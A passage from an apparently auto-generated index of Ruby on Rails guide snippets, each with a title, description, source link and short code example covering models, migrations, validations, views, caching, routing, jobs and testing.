3, first_name: \"Bob\">\n```\n\n----------------------------------------\n\nTITLE: Defining Namespaced Models in Ruby on Rails\nDESCRIPTION: This code shows how to define namespaced models for Book and Book::Order, including setting the table name prefix.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_basics.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\n# app/models/book.rb\nmodule Book\n  def self.table_name_prefix\n    \"book_\"\n  end\nend\n\n# app/models/book/order.rb\nclass Book::Order < ApplicationRecord\nend\n```\n\n----------------------------------------\n\nTITLE: Rendering a Partial from Another Directory (ERB)\nDESCRIPTION: This ERB code demonstrates how to render a partial template from a different directory within the views folder. It specifies the path to the partial using the directory structure. The underscore is still omitted.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_11\n\nLANGUAGE: ERB\nCODE:\n```\n<%= render \"application/product\" %>\n```\n\n----------------------------------------\n\nTITLE: SQL query generated by unscoped block in Rails\nDESCRIPTION: This SQL query is generated by the `Book.unscoped { Book.out_of_print }` command. It executes a query for out-of-print books, but any default scopes defined on the Book model are temporarily ignored.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_175\n\nLANGUAGE: sql\nCODE:\n```\nSELECT books.* FROM books WHERE books.out_of_print = true\n```\n\n----------------------------------------\n\nTITLE: Adding Routes with route\nDESCRIPTION: Demonstrates how to add a routing entry to the `config/routes.rb` file using the `route` method. The example sets the `PeopleController#index` action as the root route.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_application_templates.md#_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\nroute \"root to: 'person#index'\"\n```\n\n----------------------------------------\n\nTITLE: Triggering Email Notifications on Inventory Update (Rails)\nDESCRIPTION: This code snippet adds an `after_update_commit` callback to the Product model to trigger the `notify_subscribers` method when the inventory count changes from 0 to a positive number. It also defines the `back_in_stock?` method to check for this condition and the `notify_subscribers` method to send emails to all subscribers.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_111\n\nLANGUAGE: ruby\nCODE:\n```\nclass Product < ApplicationRecord\n  has_one_attached :featured_image\n  has_rich_text :description\n  has_many :subscribers, dependent: :destroy\n\n  validates :name, presence: true\n  validates :inventory_count, numericality: { greater_than_or_equal_to: 0 }\n\n  after_update_commit :notify_subscribers, if: :back_in_stock?\n\n  def back_in_stock?\n    inventory_count_previously_was.zero? && inventory_count > 0\n  end\n\n  def notify_subscribers\n    subscribers.each do |subscriber|\n      ProductMailer.with(product: self, subscriber: subscriber).in_stock.deliver_later\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Rails Transactional Test Example Ruby\nDESCRIPTION: Demonstrates how Rails automatically wraps tests in a database transaction that is rolled back after completion, ensuring test independence. Shows a test case creating a user and asserting its 'active?' state.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_32\n\nLANGUAGE: ruby\nCODE:\n```\nclass MyTest < ActiveSupport::TestCase\n  test \"newly created users are active by default\" do\n    # Since the test is implicitly wrapped in a database transaction, the user\n    # created here won't be seen by other tests.\n    assert User.create.active?\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Rails Statistics Directory Registration\nDESCRIPTION: New method for registering directories for Rails statistics, replacing the deprecated STATS_DIRECTORIES modification\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/8_0_release_notes.md#2025-04-23_snippet_1\n\nLANGUAGE: Ruby\nCODE:\n```\nRails::CodeStatistics.registery_directory\n```\n\n----------------------------------------\n\nTITLE: Query Books by Title Using LIKE and Sanitization in Ruby\nDESCRIPTION: This snippet demonstrates how to use the `LIKE` operator in conjunction with `sanitize_sql_like` to safely query for books with titles that start with a user-provided string.  `sanitize_sql_like` escapes any wildcard characters in the input string.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_57\n\nLANGUAGE: ruby\nCODE:\n```\nBook.where(\"title LIKE ?\",\n  Book.sanitize_sql_like(params[:title]) + \"%\" )\n```\n\n----------------------------------------\n\nTITLE: Deleting an Active Record Object in Ruby\nDESCRIPTION: Retrieves a single 'Book' record by its title using `find_by` and then removes it from the database using the `destroy` instance method. This operation triggers associated callbacks (e.g., `before_destroy`, `after_destroy`) and handles dependent associations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_basics.md#2025-04-23_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\nbook = Book.find_by(title: \"The Lord of the Rings\")\nbook.destroy\n```\n\n----------------------------------------\n\nTITLE: Logging Zeitwerk Output to a File - Ruby\nDESCRIPTION: Configures Zeitwerk autoloaders to write their logs to a specific file path, leveraging the Ruby Logger class. Should be set in 'config/application.rb'. The file location is dynamically determined using 'Rails.root'. Requires Ruby's standard Logger and an initialized Rails environment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/autoloading_and_reloading_constants.md#2025-04-23_snippet_22\n\nLANGUAGE: ruby\nCODE:\n```\nRails.autoloaders.logger = Logger.new(\"#{Rails.root}/log/autoloading.log\")\n\n```\n\n----------------------------------------\n\nTITLE: Using allow_blank Option for Conditional Validation in Rails\nDESCRIPTION: This code shows the allow_blank option which skips validation when the attribute is blank (nil or empty string). The Topic model validates that title must be exactly 6 characters long unless it's blank.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_45\n\nLANGUAGE: ruby\nCODE:\n```\nclass Topic < ApplicationRecord\n  validates :title, length: { is: 6 }, allow_blank: true\nend\n```\n\n----------------------------------------\n\nTITLE: Adding Presence Validation in Rails\nDESCRIPTION: This snippet demonstrates how to add a presence validation to an ActiveRecord model. The validation ensures that the `name` attribute must be present (not blank) before the record can be saved. This prevents invalid data from being stored in the database.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_30\n\nLANGUAGE: ruby\nCODE:\n```\nclass Product < ApplicationRecord\n  validates :name, presence: true\nend\n```\n\n----------------------------------------\n\nTITLE: Example Cache Fetch Hit Payload in ActiveSupport\nDESCRIPTION: Example of a payload structure for cache_fetch_hit.active_support event emitted when fetch with a block successfully hits the cache. Contains the key and store class name.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_22\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  key: \"name-of-complicated-computation\",\n  store: \"ActiveSupport::Cache::MemCacheStore\"\n}\n```\n\n----------------------------------------\n\nTITLE: Rendering with Variants in Rails\nDESCRIPTION: This code snippet demonstrates how to render different templates based on the variant set on the render call. It shows how Rails looks for templates with specific suffixes (e.g., mobile, desktop) and renders the first one that exists.  If no matching template is found, an ActionView::MissingTemplate error is raised.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_24\n\nLANGUAGE: ruby\nCODE:\n```\n# called in HomeController#index\nrender variants: [:mobile, :desktop]\n```\n\n----------------------------------------\n\nTITLE: Creating Database Migration for has_one and belongs_to Relationship\nDESCRIPTION: Shows how to create database tables and set up the foreign key for a one-to-one relationship between suppliers and accounts. The foreign key is placed in the accounts table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_61\n\nLANGUAGE: ruby\nCODE:\n```\nclass CreateSuppliers < ActiveRecord::Migration[8.1]\n  def change\n    create_table :suppliers do |t|\n      t.string :name\n      t.timestamps\n    end\n\n    create_table :accounts do |t|\n      t.belongs_to :supplier_id\n      t.string :account_number\n      t.timestamps\n    end\n\n    add_index :accounts, :supplier_id\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Implementing Acts as Yaffle Functionality in Ruby on Rails\nDESCRIPTION: This code snippet shows the implementation of the Acts as Yaffle module, including the squawk method and class methods for configuring the yaffle_text_field.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_23\n\nLANGUAGE: ruby\nCODE:\n```\nmodule Yaffle\n  module ActsAsYaffle\n    extend ActiveSupport::Concern\n\n    included do\n      def squawk(string)\n        write_attribute(self.class.yaffle_text_field, string.to_squawk)\n      end\n    end\n\n    class_methods do\n      def acts_as_yaffle(options = {})\n        cattr_accessor :yaffle_text_field, default: (options[:yaffle_text_field] || :last_squawk).to_s\n      end\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Irreversible migration example\nDESCRIPTION: Demonstrates how to prevent a migration from being reverted by raising `ActiveRecord::IrreversibleMigration` in the `down` method. This is useful when the migration performs an action that cannot be undone, such as deleting data.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_59\n\nLANGUAGE: ruby\nCODE:\n```\nclass IrreversibleMigrationExample < ActiveRecord::Migration[8.1]\n  def up\n    drop_table :example_table\n  end\n\n  def down\n    raise ActiveRecord::IrreversibleMigration, \"This migration cannot be reverted because it destroys data.\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Example of Long Line Handling in Documentation\nDESCRIPTION: Demonstrates how to format long lines in code examples by placing the resulting output on the next line, while maintaining the correct `# =>` prefix formatting.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\n#   label(:article, :title)\n#   # => <label for=\"article_title\">Title</label>\n#\n#   label(:article, :title, \"A short title\")\n#   # => <label for=\"article_title\">A short title</label>\n#\n#   label(:article, :title, \"A short title\", class: \"title_label\")\n#   # => <label for=\"article_title\" class=\"title_label\">A short title</label>\n```\n\n----------------------------------------\n\nTITLE: Pattern Matching with local_assigns in Ruby\nDESCRIPTION: This example demonstrates how to use Ruby 3.1's pattern matching assignment with `local_assigns`. It shows how to extract specific keys and their values from the `local_assigns` hash, and how to capture any remaining keys into a separate hash.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_24\n\nLANGUAGE: ruby\nCODE:\n```\nlocal_assigns => { product:, **options }\nproduct # => \"#<Product:0x0000000109ec5d10>\"\noptions # => {}\n```\n\n----------------------------------------\n\nTITLE: Forcing Reload of Association via reload_association - Ruby\nDESCRIPTION: Forces ActiveRecord to reload the association from the database, bypassing any cached version. Assumes @book has a belongs_to :author association. Useful for ensuring the most recent data is accessed. Returns the latest Author object or nil.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\n@author = @book.reload_author\n```\n\n----------------------------------------\n\nTITLE: Preventing instance reader generation with class_attribute\nDESCRIPTION: This code snippet shows how to prevent the generation of the reader instance method for a `class_attribute` by setting the `:instance_reader` option to `false`. Attempting to access the attribute on an instance will then raise a `NoMethodError`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_27\n\nLANGUAGE: ruby\nCODE:\n```\nclass A\n  class_attribute :x, instance_reader: false\nend\n\nA.new.x = 1\nA.new.x # NoMethodError\n```\n\n----------------------------------------\n\nTITLE: SQL Generated for has_one through with disable_joins Option\nDESCRIPTION: Example SQL queries generated when accessing a has_one through association with disable_joins option. This shows how Rails performs two separate queries instead of using a join across different databases.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_33\n\nLANGUAGE: sql\nCODE:\n```\nSELECT \"home\".\"id\" FROM \"homes\" WHERE \"homes\".\"dog_id\" = ? [[\"dog_id\", 1]]\nSELECT \"yards\".* FROM \"yards\" WHERE \"yards\".\"home_id\" = ? [[\"home_id\", 1]]\n```\n\n----------------------------------------\n\nTITLE: Truncate String with Separator\nDESCRIPTION: This snippet shows how to truncate a string at a natural break point using a separator. The separator can be a string or a regular expression. The truncation considers the length of the omission string, preventing cutting words.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_44\n\nLANGUAGE: ruby\nCODE:\n```\n\"Oh dear! Oh dear! I shall be late!\".truncate(18)\n# => \"Oh dear! Oh dea...\"\n\"Oh dear! Oh dear! I shall be late!\".truncate(18, separator: \" \")\n# => \"Oh dear! Oh...\"\n```\n\n----------------------------------------\n\nTITLE: Fragment Caching in Action Mailer Views (ERB)\nDESCRIPTION: This snippet shows how to use fragment caching within a mailer view template using the cache helper in ERB. When enabled via config, it caches the rendered fragment for improved performance. Requires Rails cache to be enabled for Action Mailer.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_23\n\nLANGUAGE: html+erb\nCODE:\n```\n<% cache do %>\n  <%= @company.name %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Enqueuing a job with a relative delay\nDESCRIPTION: This code enqueues `GuestsCleanupJob` to be performed after a week.  It uses `set` method to define `wait` option which accepts a duration. Then, `perform_later` enqueues the job with the delay and passes `guest` as an argument.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\n# Enqueue a job to be performed 1 week from now.\nGuestsCleanupJob.set(wait: 1.week).perform_later(guest)\n```\n\n----------------------------------------\n\nTITLE: Configuring Template Caching in Production Environment in Ruby on Rails\nDESCRIPTION: This code configures Rails to cache templates in production environment for improved performance. Template caching prevents checking for new template files when rendered, providing a speed boost at the cost of not being able to replace templates without restarting the server.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_3_release_notes.md#2025-04-23_snippet_20\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_view.cache_template_loading = true\n```\n\n----------------------------------------\n\nTITLE: Active Storage Attachment Behavior in Rails 5.2\nDESCRIPTION: Demonstration of how the has_many_attached association behaves in Rails 5.2, where assigning to a collection of attachments appends new files rather than replacing them.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_42\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  has_many_attached :highlights\nend\n\nuser.highlights.attach(filename: \"funky.jpg\")\nuser.highlights.count # => 1\n\nblob = ActiveStorage::Blob.create_after_upload!(filename: \"town.jpg\")\nuser.update!(highlights: [ blob ])\n\nuser.highlights.count # => 2\nuser.highlights.first.filename # => \"funky.jpg\"\nuser.highlights.second.filename # => \"town.jpg\"\n```\n\n----------------------------------------\n\nTITLE: Querying with pluck in Rails\nDESCRIPTION: Demonstrates how to use `pluck` to retrieve values from specified columns in a relation. It shows how `pluck` returns an array of values directly from the database result, avoiding ActiveRecord object instantiation for better performance.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_194\n\nLANGUAGE: irb\nCODE:\n```\nirb> Book.where(out_of_print: true).pluck(:id)\nSELECT id FROM books WHERE out_of_print = true\n=> [1, 2, 3]\n```\n\nLANGUAGE: irb\nCODE:\n```\nirb> Order.distinct.pluck(:status)\nSELECT DISTINCT status FROM orders\n=> [\"shipped\", \"being_packed\", \"cancelled\"]\n```\n\nLANGUAGE: irb\nCODE:\n```\nirb> Customer.pluck(:id, :first_name)\nSELECT customers.id, customers.first_name FROM customers\n=> [[1, \"David\"], [2, \"Fran\"], [3, \"Jose\"]]\n```\n\n----------------------------------------\n\nTITLE: Using 'reversible' in Rails Migrations\nDESCRIPTION: This snippet demonstrates using the 'reversible' method in Rails migrations to define actions for both migrating up and reverting down. It changes the 'price' column type from integer to string when migrating up and from string to integer when migrating down.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_55\n\nLANGUAGE: ruby\nCODE:\n```\nclass ChangeProductsPrice < ActiveRecord::Migration[8.1]\n  def change\n    reversible do |direction|\n      change_table :products do |t|\n        direction.up   { t.change :price, :string }\n        direction.down { t.change :price, :integer }\n      end\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: HTML5 Data Attributes Generation in Ruby\nDESCRIPTION: Demonstrates the new convenience idiom for generating HTML5 data-* attributes in tag helpers using a :data hash option. Values are JSON-encoded except for strings and symbols.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_1_release_notes.md#2025-04-23_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\ntag(\"div\", :data => {:name => 'Stephen', :city_state => %w(Chicago IL)})\n# => <div data-name=\"Stephen\" data-city-state=\"[&quot;Chicago&quot;,&quot;IL&quot;]\" />\n```\n\n----------------------------------------\n\nTITLE: Solid Queue Concurrency Control Example\nDESCRIPTION: This Ruby snippet demonstrates how to limit the concurrency of a job using the `limits_concurrency` method.  It limits the number of concurrent `MyJob` instances for the same account to two, with a duration of 5 minutes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_17\n\nLANGUAGE: Ruby\nCODE:\n```\nclass MyJob < ApplicationJob\n  limits_concurrency to: 2, key: ->(contact) { contact.account }, duration: 5.minutes\n\n  def perform(contact)\n    # perform job logic\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Caching a Product Header - ERB\nDESCRIPTION: This snippet demonstrates caching a specific part of a page (the product header) using Rails' `cache` helper.  It passes the `@product` object to generate a unique cache key, improving performance by storing the HTML output.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_76\n\nLANGUAGE: erb\nCODE:\n```\n<% cache @product do %>\n  <h1><%= @product.name %></h1>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Defining internal attributes with attr_internal Ruby\nDESCRIPTION: This snippet shows how to use `attr_internal` to define an internal attribute in a Ruby class. It avoids naming collisions with client code by using a prefixed instance variable (e.g., `@_log_level`). The naming format is configurable.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\nclass MyCrawler < ThirdPartyLibrary::Crawler\n  attr_accessor :log_level\nend\n```\n\n----------------------------------------\n\nTITLE: Conditional Layouts in Rails\nDESCRIPTION: This code snippet shows how to use the `:only` and `:except` options with the `layout` declaration to specify different layouts for specific controller actions.  The example shows using the `product` layout for all actions except `index` and `rss`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_28\n\nLANGUAGE: ruby\nCODE:\n```\nclass ProductsController < ApplicationController\n  layout \"product\", except: [:index, :rss]\nend\n```\n\n----------------------------------------\n\nTITLE: Implementing Error Handling in Ruby on Rails Mailer\nDESCRIPTION: This snippet demonstrates how to use rescue_from in a Rails mailer to handle errors that occur during the mailing process, including deserialization errors and third-party service errors.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_41\n\nLANGUAGE: ruby\nCODE:\n```\nclass NotifierMailer < ApplicationMailer\n  rescue_from ActiveJob::DeserializationError do\n    # ...\n  end\n\n  rescue_from \"SomeThirdPartyService::ApiError\" do\n    # ...\n  end\n\n  def notify(recipient)\n    mail(to: recipient, subject: \"Notification\")\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Hash Assert Valid Keys Ruby\nDESCRIPTION: The `assert_valid_keys` method validates that a hash only contains the provided keys. This is often used to prevent passing invalid options, raising an `ArgumentError` if the hash contains unrecognized keys. Useful for configuration validation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_132\n\nLANGUAGE: ruby\nCODE:\n```\n{ a: 1 }.assert_valid_keys(:a)  # passes\n{ a: 1 }.assert_valid_keys(\"a\") # ArgumentError\n```\n\n----------------------------------------\n\nTITLE: Using Encrypted and Signed Cookies in Rails\nDESCRIPTION: This example illustrates how to use encrypted and signed cookies for storing sensitive data. It shows setting an encrypted cookie with an expiration date and reading its value.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_22\n\nLANGUAGE: ruby\nCODE:\n```\nclass CookiesController < ApplicationController\n  def set_cookie\n    cookies.signed[:user_id] = current_user.id\n    cookies.encrypted[:expiration_date] = Date.tomorrow # => Thu, 20 Mar 2024\n    redirect_to action: \"read_cookie\"\n  end\n\n  def read_cookie\n    cookies.encrypted[:expiration_date] # => \"2024-03-20\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Testing Action Cable Channel Subscription\nDESCRIPTION: This code demonstrates how to test an Action Cable channel subscription. It uses `ActionCable::Channel::TestCase` to simulate a subscription and assert that the connection is subscribed to a specific stream based on room.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_107\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"test_helper\"\n\nclass ChatChannelTest < ActionCable::Channel::TestCase\n  test \"subscribes and stream for room\" do\n    # Simulate a subscription creation by calling `subscribe`\n    subscribe room: \"15\"\n\n    # You can access the Channel object via `subscription` in tests\n    assert subscription.confirmed?\n    assert_has_stream \"chat_15\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Using Proc for Dynamic Validation Error Messages in Rails\nDESCRIPTION: This snippet shows how to use a Proc to create dynamic error messages in validations. The Proc receives the object being validated and data about the validation context.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_47\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  validates :username,\n    uniqueness: {\n      # object = person object being validated\n      # data = { model: \"Person\", attribute: \"Username\", value: <username> }\n      message: ->(object, data) do\n        \"Hey #{object.name}, #{data[:value]} is already taken.\"\n      end\n    }\nend\n```\n\n----------------------------------------\n\nTITLE: Setting I18n fallbacks to array of locales in Rails\nDESCRIPTION: Sets the `config.i18n.fallbacks` option to an array of locales (`[:tr, :en]`), specifying the order in which to search for missing translations.  If a translation is not found in the current locale, it will first look in `:tr`, then in `:en`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_28\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.i18n.fallbacks = [:tr, :en]\n```\n\n----------------------------------------\n\nTITLE: Formatting Numbers as Human-Readable Words in Ruby\nDESCRIPTION: Demonstrates how to format numbers into human-readable words using the `to_fs(:human)` method. This is part of ActiveSupport's Numeric core extensions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_104\n\nLANGUAGE: ruby\nCODE:\n```\n123.to_fs(:human)               # => \"123\"\n1234.to_fs(:human)              # => \"1.23 Thousand\"\n12345.to_fs(:human)             # => \"12.3 Thousand\"\n1234567.to_fs(:human)           # => \"1.23 Million\"\n1234567890.to_fs(:human)        # => \"1.23 Billion\"\n1234567890123.to_fs(:human)     # => \"1.23 Trillion\"\n1234567890123456.to_fs(:human)  # => \"1.23 Quadrillion\"\n```\n\n----------------------------------------\n\nTITLE: Passing Local Variables to Partial (new.html.erb)\nDESCRIPTION: This code snippet demonstrates how to pass a local variable named `zone` with the value of `@zone` to the `_form` partial when rendering the `new` view. This allows the partial to access the `zone` object within its scope.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_76\n\nLANGUAGE: html+erb\nCODE:\n```\n<h1>New zone</h1>\n<%= render partial: \"form\", locals: {zone: @zone} %>\n```\n\n----------------------------------------\n\nTITLE: Setting Environment Variable for Memory Allocator Configuration in Linux\nDESCRIPTION: This code sets the MALLOC_ARENA_MAX environment variable to 2, which is a configuration option for the default memory allocator to reduce memory fragmentation. This is a less efficient alternative to using jemalloc but can help if jemalloc installation isn't possible.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/tuning_performance_for_deployment.md#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nMALLOC_ARENA_MAX=2\n```\n\n----------------------------------------\n\nTITLE: Configuring Autoload Paths in Rails Application\nDESCRIPTION: This snippet shows how to configure autoload paths in a Rails application, including setting up autoload_once_paths and eager_load_paths. It also demonstrates how to ignore certain directories from autoloading.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/autoloading_and_reloading_constants.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\n# config/application.rb\nmodule MyApp\n  class Application < Rails::Application\n    lib = root.join(\"lib\")\n\n    config.autoload_once_paths << lib\n    config.eager_load_paths << lib\n\n    Rails.autoloaders.once.ignore(\n      lib.join(\"assets\"),\n      lib.join(\"tasks\"),\n      lib.join(\"generators\")\n    )\n\n    # ...\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Using Parametric Scope Helpers in Rails\nDESCRIPTION: Demonstrates how to use the path and URL helpers generated by the parametric scope. It shows how to pass objects to the helpers and the resulting paths that are generated.  `account_article_path` and `url_for` are used as examples.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_73\n\nLANGUAGE: ruby\nCODE:\n```\naccount_article_path(@account, @article) # => /1/article/9\nurl_for([@account, @article])            # => /1/article/9\nform_with(model: [@account, @article])   # => <form action=\"/1/article/9\" ...>\n```\n\n----------------------------------------\n\nTITLE: Strong Parameters - Permit! Method\nDESCRIPTION: Demonstrates the `permit!` method for permitting an entire hash of parameters without checking the values. It includes a warning about the risks of using this method due to allowing mass assignment of all current and future model attributes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\nparams = ActionController::Parameters.new(id: 1, admin: \"true\")\nparams.permit!\n```\n\n----------------------------------------\n\nTITLE: Fixtures YAML with Composite Key - Composite Identify\nDESCRIPTION: This snippet demonstrates the YAML fixture file using `ActiveRecord::FixtureSet.composite_identify` to handle composite primary key relationships. It shows how to reference related fixtures using the composite keys.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_composite_primary_keys.md#_snippet_20\n\nLANGUAGE: yml\nCODE:\n```\n# book_orders.yml\nalices_adventure_in_wonderland_in_books:\n  author: lewis_carroll\n  book_id: <%= ActiveRecord::FixtureSet.composite_identify(\n              :alices_adventure_in_wonderland, Book.primary_key)[:id] %>\n  shop: book_store\n  order_id: <%= ActiveRecord::FixtureSet.composite_identify(\n              :books, Order.primary_key)[:id] %>\n```\n\n----------------------------------------\n\nTITLE: Interacting with Extended String in Rails Console - IRB\nDESCRIPTION: Demonstrates the usage of the newly added 'to_squawk' method in a live Rails console session. Shows that calling 'to_squawk' on a string returns the expected prefixed string output. No dependencies beyond a loaded plugin in the Rails console.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_9\n\nLANGUAGE: irb\nCODE:\n```\nirb> \"Hello World\".to_squawk\n=> \"squawk! Hello World\"\n```\n\n----------------------------------------\n\nTITLE: Creating Paths with Magazine and Ad Objects - Ruby/ERB\nDESCRIPTION: This snippet demonstrates how to create a path using `magazine_ad_path` helper by passing instances of `Magazine` and `Ad` objects instead of their numeric IDs. The generated path will be something like `/magazines/5/ads/42`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_21\n\nLANGUAGE: erb\nCODE:\n```\n<%= link_to 'Ad details', magazine_ad_path(@magazine, @ad) %>\n```\n\n----------------------------------------\n\nTITLE: Running a Single Active Record Test File Against MySQL in Bash\nDESCRIPTION: Executes a specific Active Record test file (`test/cases/associations/has_many_associations_test.rb`) directly using Ruby, targeting the `mysql2` adapter via the `ARCONN` environment variable. The `-Itest` flag adds the test directory to the Ruby load path.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_29\n\nLANGUAGE: bash\nCODE:\n```\n$ ARCONN=mysql2 bundle exec ruby -Itest test/cases/associations/has_many_associations_test.rb\n```\n\n----------------------------------------\n\nTITLE: Configuring development database.yml for Solid Queue\nDESCRIPTION: This code configures the `database.yml` file to include a separate database connection for the `queue` database in the development environment. This allows Solid Queue to store job data in a separate database from the primary application data.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\n# config/database.yml\ndevelopment:\n  primary:\n    <<: *default\n    database: storage/development.sqlite3\n  queue:\n    <<: *default\n    database: storage/development_queue.sqlite3\n    migrations_paths: db/queue_migrate\n```\n\n----------------------------------------\n\nTITLE: Configuring Self-Join with Custom Foreign Keys\nDESCRIPTION: Demonstrates how to set up a many-to-many self-join relationship using :association_foreign_key and :foreign_key options. This allows users to have many friends who are also users in the system.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_115\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  has_and_belongs_to_many :friends,\n      class_name: \"User\",\n      foreign_key: \"this_user_id\",\n      association_foreign_key: \"other_user_id\"\nend\n```\n\n----------------------------------------\n\nTITLE: Testing a Helper Method - Ruby\nDESCRIPTION: This snippet tests the `link_to_user` helper method defined in the `UsersHelper` module. It asserts that the helper method returns the expected HTML output for a given user. It relies on ActionView::TestCase to provide Rails' helper methods.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_93\n\nLANGUAGE: ruby\nCODE:\n```\nclass UsersHelperTest < ActionView::TestCase\n  test \"should return the user's full name\" do\n    user = users(:david)\n\n    assert_dom_equal %{<a href=\"/user/#{user.id}\">David Heinemeier Hansson</a>}, link_to_user(user)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Redefining methods without warnings in Ruby\nDESCRIPTION: This section discusses the use of `redefine_method` and `silence_redefinition_of_method` to prevent warnings when redefining methods. `redefine_method` automatically removes the existing method before defining the new one, while `silence_redefinition_of_method` suppresses warnings while allowing manual redefinition.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_22\n\n\n\n----------------------------------------\n\nTITLE: Browser Version Guard Configuration\nDESCRIPTION: Examples of configuring browser version requirements in Rails controllers to restrict access based on browser versions.\nSOURCE: 